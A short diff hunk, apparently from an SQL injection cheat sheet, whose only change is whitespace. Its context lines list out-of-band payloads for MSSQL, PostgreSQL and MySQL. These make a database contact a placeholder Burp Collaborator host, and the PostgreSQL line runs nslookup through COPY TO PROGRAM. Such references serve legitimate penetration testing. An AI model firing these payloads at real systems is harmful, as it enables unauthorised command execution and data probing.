@@ -24,7 +24,7 @@ exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
 
 --PostgreSQL	
 copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
-
+ 
 --MySQL	The following techniques work on Windows only:
 LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
 SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
